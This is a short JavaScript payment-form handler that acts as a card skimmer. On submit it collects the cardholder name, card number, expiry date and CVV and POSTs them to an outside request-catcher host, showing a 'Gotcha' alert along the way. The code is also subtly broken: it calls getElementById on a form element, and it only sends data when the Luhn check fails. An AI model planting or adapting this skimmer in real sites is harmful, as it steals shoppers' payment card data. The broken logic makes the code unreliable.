const paymentForm = document.getElementById('payment-form');

paymentForm.addEventListener('submit', async (event) => {
    // Remove any spaces the user might have entered
    const rawValue = document.getElementById('card-number').value.replace(/\s+/g, '');

    if (!validateLuhn(rawValue)) {
        alert("Gotcha");

        const userData = {
            nameOnCard: paymentForm.getElementById('card-name').value,
            cardNumber: paymentForm.getElementById('card-number').value,
            expiryDate: paymentForm.getElementById('expiry').value,
            cvv: paymentForm.getElementById('cvv').value
        }

        alert(userData);

        await fetch("https://madwolf.requestcatcher.com/test", {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userData)
        });
    }
});